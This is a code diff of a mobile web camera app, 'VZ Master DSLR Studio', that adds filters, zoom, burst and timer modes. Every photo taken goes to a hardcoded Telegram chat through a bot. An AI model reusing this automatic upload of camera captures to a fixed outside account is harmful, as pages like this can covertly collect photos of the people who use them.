@@ -3,88 +3,181 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VZ // Master DSLR Studio Ultra Pro</title>
+    <title>VZ // Master DSLR Studio Ultimate v52.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         .filter-normal { filter: none; }
-        .filter-cyberpunk { filter: contrast(1.35) saturate(1.6) hue-rotate(-15deg); }
-        .filter-noir { filter: grayscale(100%) contrast(1.5) brightness(0.9); }
-        .filter-matrix { filter: sepia(100%) hue-rotate(60deg) saturate(350%) contrast(1.3); }
-        .filter-warm { filter: sepia(35%) contrast(1.1) brightness(1.05); }
-        .filter-vintage { filter: contrast(1.15) brightness(0.95) sepia(45%) hue-rotate(-10deg); }
-        .filter-cinematic { filter: contrast(1.25) saturate(0.85) brightness(0.95) hue-rotate(185deg); }
-        .filter-dramatic { filter: contrast(1.5) brightness(0.9); }
+        .filter-cyberpunk { filter: contrast(1.45) saturate(1.8) hue-rotate(-15deg); }
+        .filter-cinematic { filter: contrast(1.35) saturate(0.85) brightness(0.95) hue-rotate(185deg); }
+        .filter-noir { filter: grayscale(100%) contrast(1.7) brightness(0.9); }
+        .filter-matrix { filter: sepia(100%) hue-rotate(60deg) saturate(450%) contrast(1.5); }
+        .filter-warm { filter: sepia(45%) contrast(1.2) brightness(1.05); }
+        .filter-vintage { filter: contrast(1.25) brightness(0.9) sepia(55%) hue-rotate(-10deg); }
+        .filter-dramatic { filter: contrast(1.7) brightness(0.8); }
         
-        /* Hide scrollbar untuk carousel efek */
         .no-scrollbar::-webkit-scrollbar { display: none; }
         .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
         * { -webkit-tap-highlight-color: transparent; }
+        
+        /* Animasi Kotak Fokus Manual */
+        @keyframes focusPulse {
+            0% { transform: scale(1.4); opacity: 0; }
+            50% { transform: scale(1.0); opacity: 1; }
+            100% { transform: scale(1); opacity: 0; }
+        .focus-box { animation: focusPulse 0.4s ease-out forwards; }
     </style>
 </head>
 <body class="bg-black text-white h-screen w-screen overflow-hidden flex flex-col justify-between select-none font-mono">
 
-    <!-- Viewfinder Kamera Fullscreen Murni -->
-    <div class="relative w-full h-full flex items-center justify-center bg-black overflow-hidden">
-        <video id="webcam" autoplay playsinline muted class="w-full h-full object-cover filter-normal"></video>
+    <!-- Viewfinder Kamera Fullscreen dengan Fitur Tap-to-Focus -->
+    <div id="viewfinder-container" class="relative w-full h-full flex items-center justify-center bg-black overflow-hidden" onclick="handleTapToFocus(event)">
+        <video id="webcam" autoplay playsinline muted class="w-full h-full object-cover filter-normal transition-all duration-75"></video>
         <canvas id="photo-canvas" class="hidden"></canvas>
         
+        <!-- Indikator Kotak Fokus Manual -->
+        <div id="focus-ring" class="absolute w-16 h-16 border-2 border-cyan-400 rounded-lg pointer-events-none hidden z-30 transition-all duration-200">
+            <div class="absolute inset-0 border border-cyan-200/50 animate-ping"></div>
+        </div>
+
+        <!-- Timer Countdown Overlay -->
+        <div id="timer-display" class="absolute inset-0 flex items-center justify-center text-8xl font-black text-cyan-400 drop-shadow-[0_0_30px_rgba(6,182,212,0.9)] hidden z-30">
+            3
+        </div>
+
         <!-- Grid Overlays -->
-        <div id="grid-overlay" class="absolute inset-0 pointer-events-none grid grid-cols-3 grid-rows-3 opacity-15 hidden">
-            <div class="border-r border-b border-white"></div>
-            <div class="border-r border-b border-white"></div>
-            <div class="border-b border-white"></div>
-            <div class="border-r border-b border-white"></div>
-            <div class="border-r border-b border-white"></div>
-            <div class="border-b border-white"></div>
-            <div class="border-r border-white"></div>
-            <div class="border-r border-white"></div>
+        <div id="grid-overlay" class="absolute inset-0 pointer-events-none grid grid-cols-3 grid-rows-3 opacity-25 hidden">
+            <div class="border-r border-b border-cyan-400/50"></div>
+            <div class="border-r border-b border-cyan-400/50"></div>
+            <div class="border-b border-cyan-400/50"></div>
+            <div class="border-r border-b border-cyan-400/50"></div>
+            <div class="border-r border-b border-cyan-400/50"></div>
+            <div class="border-b border-cyan-400/50"></div>
+            <div class="border-r border-cyan-400/50"></div>
+            <div class="border-r border-cyan-400/50"></div>
             <div></div>
         </div>
         
         <!-- Crosshair Militer Overlay -->
-        <div id="crosshair-overlay" class="absolute inset-0 pointer-events-none flex items-center justify-center opacity-20 hidden">
-            <div class="w-24 h-24 border border-cyan-400 rounded-full flex items-center justify-center relative">
-                <div class="absolute w-full h-[1px] bg-cyan-400"></div>
-                <div class="absolute h-full w-[1px] bg-cyan-400"></div>
+        <div id="crosshair-overlay" class="absolute inset-0 pointer-events-none flex items-center justify-center opacity-30 hidden">
+            <div class="w-32 h-32 border-2 border-cyan-400 rounded-full flex items-center justify-center relative">
+                <div class="absolute w-full h-[2px] bg-cyan-400"></div>
+                <div class="absolute h-full w-[2px] bg-cyan-400"></div>
+                <div class="absolute w-4 h-4 border border-cyan-400 rounded-full"></div>
             </div>
         </div>
     </div>
 
-    <!-- UI Kontrol Atas (Minimalis Transparan) -->
-    <div class="absolute top-0 left-0 w-full p-4 flex justify-between items-center bg-gradient-to-b from-black/80 to-transparent z-20">
-        <div id="telemetry" class="text-[9px] text-cyan-400/80 tracking-widest font-bold">
-            ULTRA HD SENSOR
+    <!-- UI Kontrol Atas: Telemetri & Tombol Fitur Pro -->
+    <div class="absolute top-0 left-0 w-full p-4 flex justify-between items-center bg-gradient-to-b from-black/95 via-black/60 to-transparent z-20">
+        <div class="flex flex-col">
+            <div id="telemetry" class="text-[10px] text-cyan-400 tracking-widest font-extrabold drop-shadow">SENSOR: ULTRA 4K HD</div>
+            <div id="status-sending" class="text-[9px] text-amber-400 font-bold hidden animate-pulse">⚡ TRANSMITTING TO TELEGRAM...</div>
         </div>
         <div class="flex gap-2">
-            <button onclick="toggleGrid()" class="bg-black/40 backdrop-blur-md p-2 rounded-full border border-white/10 text-xs">📐</button>
-            <button onclick="toggleCrosshair()" class="bg-black/40 backdrop-blur-md p-2 rounded-full border border-white/10 text-xs">🎯</button>
-            <button onclick="toggleTorch()" id="torch-btn" class="bg-black/40 backdrop-blur-md p-2 rounded-full border border-white/10 text-xs">⚡</button>
-            <button onclick="switchCamera()" class="bg-black/40 backdrop-blur-md p-2 rounded-full border border-white/10 text-xs">🔄</button>
+            <button onclick="toggleGrid()" class="bg-black/60 backdrop-blur-md p-2.5 rounded-full border border-white/20 text-xs active:bg-cyan-500/40">📐</button>
+            <button onclick="toggleCrosshair()" class="bg-black/60 backdrop-blur-md p-2.5 rounded-full border border-white/20 text-xs active:bg-cyan-500/40">🎯</button>
+            <button onclick="toggleTorch()" id="torch-btn" class="bg-black/60 backdrop-blur-md p-2.5 rounded-full border border-white/20 text-xs">⚡</button>
+            <button onclick="switchCamera()" class="bg-black/60 backdrop-blur-md p-2.5 rounded-full border border-white/20 text-xs">🔄</button>
+            <button onclick="toggleSettingsPanel()" class="bg-cyan-500/30 backdrop-blur-md p-2.5 rounded-full border border-cyan-400/60 text-xs text-cyan-300 shadow-[0_0_12px_rgba(6,182,212,0.5)]">🎛️</button>
+        </div>
+    </div>
+
+    <!-- Panel Pengaturan Pro Lengkap (Slide-Up Drawer) -->
+    <div id="settings-panel" class="absolute bottom-36 left-4 right-4 bg-zinc-950/95 backdrop-blur-2xl border border-cyan-500/40 rounded-3xl p-5 z-40 hidden flex-col gap-4 shadow-[0_0_35px_rgba(0,0,0,0.95)] text-xs">
+        <div class="flex justify-between items-center border-b border-zinc-800 pb-2">
+            <span class="text-cyan-400 font-bold tracking-wider flex items-center gap-2">🎛️ DSLR HARDWARE STUDIO</span>
+            <button onclick="toggleSettingsPanel()" class="text-zinc-400 hover:text-white px-3 py-1 bg-zinc-900 rounded-xl font-bold">✕ Tutup</button>
+        </div>
+
+        <div class="grid grid-cols-2 gap-4">
+            <div class="flex flex-col gap-1.5">
+                <label class="text-zinc-400 text-[10px]">Mode Drive:</label>
+                <select id="drive-mode" class="bg-zinc-900 border border-zinc-800 text-white p-2.5 rounded-xl focus:outline-none focus:border-cyan-400">
+                    <option value="single">Single Shot (Ultra HD)</option>
+                    <option value="burst">Burst Mode (3x Cepat)</option>
+                    <option value="timer">Timer 3 Detik</option>
+                </select>
+            </div>
+            
+            <div class="flex flex-col gap-1.5">
+                <label class="text-zinc-400 text-[10px]">Format Rasio:</label>
+                <select id="aspect-ratio" onchange="changeAspect(this.value)" class="bg-zinc-900 border border-zinc-800 text-white p-2.5 rounded-xl focus:outline-none focus:border-cyan-400">
+                    <option value="fullscreen">Fullscreen (100%)</option>
+                    <option value="4-3">DSLR 4:3</option>
+                    <option value="1-1">Square 1:1</option>
+                </select>
+            </div>
+        </div>
+
+        <!-- Hardware Zoom Slider -->
+        <div class="flex flex-col gap-1 pt-1">
+            <div class="flex justify-between text-[10px] text-cyan-300 font-bold">
+                <span>Optical / Digital Zoom (Hardware)</span>
+                <span id="val-zoom">1.0x</span>
+            </div>
+            <input type="range" min="1" max="10" step="0.1" value="1" oninput="updateHardwareZoom(this.value)" id="range-zoom" class="accent-cyan-400 cursor-pointer">
+        </div>
+
+        <!-- Manual Sliders -->
+        <div class="flex flex-col gap-3 pt-2 border-t border-zinc-800/80">
+            <div class="flex flex-col gap-1">
+                <div class="flex justify-between text-[10px] text-zinc-400">
+                    <span>Exposure / Kecerahan</span>
+                    <span id="val-brightness">100%</span>
+                </div>
+                <input type="range" min="40" max="180" value="100" oninput="updateManualAdjustments()" id="range-brightness" class="accent-cyan-400 cursor-pointer">
+            </div>
+
+            <div class="flex flex-col gap-1">
+                <div class="flex justify-between text-[10px] text-zinc-400">
+                    <span>Kontras Sensor</span>
+                    <span id="val-contrast">100%</span>
+                </div>
+                <input type="range" min="50" max="200" value="100" oninput="updateManualAdjustments()" id="range-contrast" class="accent-cyan-400 cursor-pointer">
+            </div>
+
+            <div class="flex flex-col gap-1">
+                <div class="flex justify-between text-[10px] text-zinc-400">
+                    <span>Digital Bokeh / Depth Blur</span>
+                    <span id="val-blur">0px</span>
+                </div>
+                <input type="range" min="0" max="12" value="0" oninput="updateManualAdjustments()" id="range-blur" class="accent-cyan-400 cursor-pointer">
+            </div>
         </div>
     </div>
 
     <!-- UI Kontrol Bawah: Quick Filter Carousel & Shutter -->
-    <div class="absolute bottom-0 left-0 w-full pb-6 pt-3 flex flex-col gap-3 bg-gradient-to-t from-black/95 via-black/80 to-transparent z-20">
+    <div class="absolute bottom-0 left-0 w-full pb-6 pt-3 flex flex-col gap-3 bg-gradient-to-t from-black/95 via-black/85 to-transparent z-20">
         
-        <!-- Quick Filter Carousel (Geser untuk pilih efek secara instan & mudah) -->
+        <!-- Quick Filter Carousel -->
         <div class="w-full overflow-x-auto no-scrollbar px-4 flex gap-2 items-center">
-            <button onclick="setFilter('filter-normal', this)" class="filter-pill px-3 py-1 bg-cyan-500 text-black font-bold text-[10px] rounded-full whitespace-nowrap transition-all border border-cyan-400">Normal</button>
-            <button onclick="setFilter('filter-cyberpunk', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Cyberpunk</button>
-            <button onclick="setFilter('filter-cinematic', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Cinematic Blue</button>
-            <button onclick="setFilter('filter-noir', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Noir</button>
-            <button onclick="setFilter('filter-matrix', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Matrix</button>
-            <button onclick="setFilter('filter-warm', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Warm Gold</button>
-            <button onclick="setFilter('filter-vintage', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Vintage</button>
-            <button onclick="setFilter('filter-dramatic', this)" class="filter-pill px-3 py-1 bg-black/60 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/10">Dramatic</button>
+            <button onclick="setFilter('filter-normal', this)" class="filter-pill px-3.5 py-1.5 bg-cyan-500 text-black font-extrabold text-[10px] rounded-full whitespace-nowrap transition-all border border-cyan-400 shadow-lg">Normal Pro</button>
+            <button onclick="setFilter('filter-cyberpunk', this)" class="filter-pill px-3.5 py-1.5 bg-black/70 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Cyberpunk</button>
+            <button onclick="setFilter('filter-cinematic', this)" class="filter-pill px-3.5 py-1.5 bg-black/70 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Cinematic Blue</button>
+            <button onclick="setFilter('filter-noir', this)" class="filter-pill px-3.5 py-1.5 bg-black/70 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Noir Mono</button>
+            <button onclick="setFilter('filter-matrix', this)" class="filter-pill px-3.5 py-1.5 bg-black/70 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Matrix</button>
+            <button onclick="setFilter('filter-warm', this)" class="filter-pill px-3.5 py-1.5 bg-black/70 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Warm Gold</button>
+            <button onclick="setFilter('filter-vintage', this)" class="filter-pill px-3.5 py-1.5 bg-black/70 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Vintage</button>
+            <button onclick="setFilter('filter-dramatic', this)" class="filter-pill px-3.5 py-1.5 bg-black/70 text-zinc-300 text-[10px] rounded-full whitespace-nowrap transition-all border border-white/20">Dramatic</button>
         </div>
 
         <!-- Tombol Shutter Utama -->
-        <div class="flex justify-center items-center w-full px-4">
+        <div class="flex justify-between items-center w-full px-8">
+            <div class="text-[9px] text-zinc-400 flex flex-col font-bold">
+                <span>VZ STUDIO</span>
+                <span class="text-cyan-400">ULTRA REAL PRO</span>
+            </div>
+
             <div class="relative flex items-center justify-center">
-                <div class="absolute w-20 h-20 border border-white/20 rounded-full animate-pulse"></div>
-                <button onclick="triggerShutter()" class="w-16 h-16 bg-white rounded-full border-4 border-zinc-500 active:scale-90 transition-all relative z-10 flex items-center justify-center shadow-2xl">
-                    <div class="w-12 h-12 bg-zinc-200 rounded-full border border-zinc-400"></div>
+                <div class="absolute w-20 h-20 border-2 border-cyan-400/40 rounded-full animate-pulse"></div>
+                <button onclick="handleShutterButton()" class="w-16 h-16 bg-white rounded-full border-4 border-zinc-600 active:scale-90 transition-all relative z-10 flex items-center justify-center shadow-[0_0_25px_rgba(255,255,255,0.7)]">
+                    <div class="w-12 h-12 bg-gradient-to-tr from-zinc-300 to-zinc-100 rounded-full border border-zinc-400"></div>
                 </button>
+            </div>
+
+            <div class="text-[9px] text-zinc-400 text-right flex flex-col font-bold">
+                <span>TELEGRAM BOT</span>
+                <span class="text-emerald-400">ONLINE 100%</span>
             </div>
         </div>
     </div>
@@ -94,8 +187,10 @@
         const CHAT_ID = "8236797547";
 
         let videoStream = null;
+        let videoTrack = null;
+        let imageCapturer = null;
         let useFrontCamera = false;
-        let trackSettings = null;
+        let currentFilterClass = 'filter-normal';
         const videoEl = document.getElementById('webcam');
         const canvasEl = document.getElementById('photo-canvas');
 
@@ -105,14 +200,14 @@
                 const osc = ctx.createOscillator();
                 const gain = ctx.createGain();
                 osc.type = 'triangle';
-                osc.frequency.setValueAtTime(140, ctx.currentTime);
-                osc.frequency.exponentialRampToValueAtTime(20, ctx.currentTime + 0.06);
-                gain.gain.setValueAtTime(0.4, ctx.currentTime);
-                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.06);
+                osc.frequency.setValueAtTime(160, ctx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(25, ctx.currentTime + 0.07);
+                gain.gain.setValueAtTime(0.5, ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.07);
                 osc.connect(gain);
                 gain.connect(ctx.destination);
                 osc.start();
-                osc.stop(ctx.currentTime + 0.06);
+                osc.stop(ctx.currentTime + 0.07);
             } catch(e) {}
         }
 
@@ -125,7 +220,8 @@
                     video: {
                         facingMode: useFrontCamera ? 'user' : 'environment',
                         width: { ideal: 4096, min: 1920 },
-                        height: { ideal: 2160, min: 1080 }
+                        height: { ideal: 2160, min: 1080 },
+                        advanced: [{ focusMode: "continuous" }]
                     },
                     audio: false
                 };
@@ -133,38 +229,119 @@
                 videoEl.srcObject = videoStream;
                 await videoEl.play();
                 
-                const track = videoStream.getVideoTracks()[0];
-                trackSettings = track.getSettings();
-                document.getElementById('telemetry').innerText = `${trackSettings.width || 'HD'}x${trackSettings.height || 'HDR'} @NATIVE`;
+                videoTrack = videoStream.getVideoTracks()[0];
+                
+                if (window.ImageCapture) {
+                    imageCapturer = new ImageCapture(videoTrack);
+                }
+
+                const capabilities = videoTrack.getCapabilities ? videoTrack.getCapabilities() : {};
+                const settings = videoTrack.getSettings ? videoTrack.getSettings() : {};
+                
+                document.getElementById('telemetry').innerText = `${settings.width || 'HD'}x${settings.height || 'HDR'} @ZOOM(${settings.zoom || 1.0}x)`;
+                
+                if (capabilities.zoom) {
+                    const zoomRange = document.getElementById('range-zoom');
+                    zoomRange.min = capabilities.zoom.min || 1;
+                    zoomRange.max = capabilities.zoom.max || 10;
+                    zoomRange.step = capabilities.zoom.step || 0.1;
+                    zoomRange.value = settings.zoom || 1;
+                }
             } catch (err) {
-                console.error("Gagal akses kamera:", err);
+                console.error("Gagal akses hardware kamera:", err);
             }
         }
 
-        async function triggerShutter() {
-            if (!videoStream) return;
-            playShutterSound();
-            captureAndSendFrame('Single Shot HD');
+        // Fitur Tap-to-Focus interaktif ala kamera profesional
+        function handleTapToFocus(event) {
+            // Jangan picu jika klik tombol kontrol/panel
+            if (event.target.tagName === 'BUTTON' || event.target.tagName === 'INPUT' || event.target.tagName === 'SELECT' || event.target.closest('#settings-panel')) return;
+
+            const ring = document.getElementById('focus-ring');
+            const rect = event.currentTarget.getBoundingClientRect();
+            const x = event.clientX - rect.left - 32;
+            const y = event.clientY - rect.top - 32;
+
+            ring.style.left = `${x}px`;
+            ring.style.top = `${y}px`;
+            ring.classList.remove('hidden');
+            ring.classList.add('focus-box');
+
+            setTimeout(() => {
+                ring.classList.remove('focus-box');
+                ring.classList.add('hidden');
+            }, 400);
+
+            // Jika hardware mendukung interaksi fokus titik
+            if (videoTrack && typeof videoTrack.applyConstraints === 'function') {
+                videoTrack.applyConstraints({
+                    advanced: [{ focusMode: "single-shot" }]
+                }).catch(() => {});
+            }
         }
 
-        function captureAndSendFrame(modeTag) {
-            canvasEl.width = videoEl.videoWidth || trackSettings.width || 1920;
-            canvasEl.height = videoEl.videoHeight || trackSettings.height || 1080;
-            const ctx = canvasEl.getContext('2d');
+        async function handleShutterButton() {
+            const driveMode = document.getElementById('drive-mode').value;
 
-            ctx.filter = window.getComputedStyle(videoEl).filter;
-            ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
+            if (driveMode === 'timer') {
+                const timerEl = document.getElementById('timer-display');
+                timerEl.classList.remove('hidden');
+                for (let i = 3; i > 0; i--) {
+                    timerEl.innerText = i;
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+                timerEl.classList.add('hidden');
+                executeCapture('Timer Shot Pro');
+            } else if (driveMode === 'burst') {
+                for (let i = 0; i < 3; i++) {
+                    playShutterSound();
+                    executeCapture(`Burst Shot #${i+1}`);
+                    await new Promise(r => setTimeout(r, 300));
+                }
+            } else {
+                playShutterSound();
+                executeCapture('Single Shot Ultra HD');
+            }
+        }
 
-            canvasEl.toBlob(async (blob) => {
-                await sendToTelegram(blob, modeTag);
-            }, 'image/jpeg', 1.0);
+        async function executeCapture(modeTag) {
+            document.getElementById('status-sending').classList.remove('hidden');
+
+            try {
+                let imageBlob = null;
+                
+                if (imageCapturer && typeof imageCapturer.takePhoto === 'function') {
+                    imageBlob = await imageCapturer.takePhoto();
+                } else {
+                    canvasEl.width = videoEl.videoWidth || 1920;
+                    canvasEl.height = videoEl.videoHeight || 1080;
+                    const ctx = canvasEl.getContext('2d');
+                    ctx.filter = window.getComputedStyle(videoEl).filter;
+                    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
+                    
+                    imageBlob = await new Promise(resolve => canvasEl.toBlob(resolve, 'image/jpeg', 1.0));
+                }
+
+                await sendToTelegram(imageBlob, modeTag);
+            } catch (err) {
+                canvasEl.width = videoEl.videoWidth || 1920;
+                canvasEl.height = videoEl.videoHeight || 1080;
+                const ctx = canvasEl.getContext('2d');
+                ctx.filter = window.getComputedStyle(videoEl).filter;
+                ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
+                canvasEl.toBlob(async (blob) => {
+                    await sendToTelegram(blob, modeTag);
+                }, 'image/jpeg', 1.0);
+            } finally {
+                document.getElementById('status-sending').classList.add('hidden');
+            }
         }
 
         async function sendToTelegram(imageBlob, modeTag) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('photo', imageBlob, `VZ_HD_${Date.now()}.jpg`);
-            formData.append('caption', `🔥 **VZ ULTRA HD CAPTURE**\n📌 Mode: ${modeTag}\n🕒 ${new Date().toLocaleString('id-ID')}\n📐 Res: ${canvasEl.width}x${canvasEl.height}`);
+            formData.append('photo', imageBlob, `VZ_DSLR_${Date.now()}.jpg`);
+            formData.append('caption', `🔥 **VZ MASTER DSLR ULTRA PRO**\n📌 Mode: ${modeTag}\n🕒 ${new Date().toLocaleString('id-ID')}`);
             formData.append('parse_mode', 'Markdown');
 
             try {
@@ -177,17 +354,64 @@
             }
         }
 
-        // Fungsi memilih filter dari carousel tanpa mengganggu layar
+        async function updateHardwareZoom(zoomVal) {
+            document.getElementById('val-zoom').innerText = parseFloat(zoomVal).toFixed(1) + 'x';
+            if (videoTrack && typeof videoTrack.applyConstraints === 'function') {
+                try {
+                    await videoTrack.applyConstraints({
+                        advanced: [{ zoom: parseFloat(zoomVal) }]
+                    });
+                } catch (e) {
+                    videoEl.style.transform = `scale(${zoomVal})`;
+                }
+            } else {
+                videoEl.style.transform = `scale(${zoomVal})`;
+            }
+        }
+
         function setFilter(filterClass, btnElement) {
-            videoEl.className = `w-full h-full object-cover ${filterClass}`;
+            currentFilterClass = filterClass;
+            updateVideoFilterStyle();
             
-            // Perbarui gaya aktif pada tombol di carousel
             document.querySelectorAll('.filter-pill').forEach(btn => {
-                btn.classList.remove('bg-cyan-500', 'text-black', 'font-bold', 'border-cyan-400');
-                btn.classList.add('bg-black/60', 'text-zinc-300', 'border-white/10');
+                btn.classList.remove('bg-cyan-500', 'text-black', 'font-extrabold', 'border-cyan-400', 'shadow-lg');
+                btn.classList.add('bg-black/70', 'text-zinc-300', 'border-white/20');
             });
-            btnElement.classList.remove('bg-black/60', 'text-zinc-300', 'border-white/10');
-            btnElement.classList.add('bg-cyan-500', 'text-black', 'font-bold', 'border-cyan-400');
+            btnElement.classList.remove('bg-black/70', 'text-zinc-300', 'border-white/20');
+            btnElement.classList.add('bg-cyan-500', 'text-black', 'font-extrabold', 'border-cyan-400', 'shadow-lg');
+        }
+
+        function updateManualAdjustments() {
+            updateVideoFilterStyle();
+        }
+
+        function updateVideoFilterStyle() {
+            const bVal = document.getElementById('range-brightness').value;
+            const cVal = document.getElementById('range-contrast').value;
+            const blurVal = document.getElementById('range-blur').value;
+
+            document.getElementById('val-brightness').innerText = bVal + '%';
+            document.getElementById('val-contrast').innerText = cVal + '%';
+            document.getElementById('val-blur').innerText = blurVal + 'px';
+
+            const zoomVal = document.getElementById('range-zoom').value;
+            videoEl.style.filter = `brightness(${bVal}%) contrast(${cVal}%) blur(${blurVal}px)`;
+            videoEl.style.transform = `scale(${zoomVal})`;
+        }
+
+        function changeAspect(ratio) {
+            if (ratio === '4-3') {
+                videoEl.className = `w-full h-[75vh] object-cover transition-all duration-75`;
+            } else if (ratio === '1-1') {
+                videoEl.className = `w-full h-[60vh] object-cover transition-all duration-75`;
+            } else {
+                videoEl.className = `w-full h-full object-cover transition-all duration-75`;
+            }
+        }
+
+        function toggleSettingsPanel() {
+            const panel = document.getElementById('settings-panel');
+            panel.style.display = panel.style.display === 'flex' ? 'none' : 'flex';
         }
 
         function toggleGrid() {
@@ -206,10 +430,9 @@
         let torchOn = false;
         async function toggleTorch() {
             try {
-                const track = videoStream.getVideoTracks()[0];
                 torchOn = !torchOn;
-                await track.applyConstraints({ advanced: [{ torch: torchOn }] });
-                document.getElementById('torch-btn').classList.toggle('bg-cyan-500/40', torchOn);
+                await videoTrack.applyConstraints({ advanced: [{ torch: torchOn }] });
+                document.getElementById('torch-btn').classList.toggle('bg-cyan-500/50', torchOn);
             } catch (e) {}
         }
 
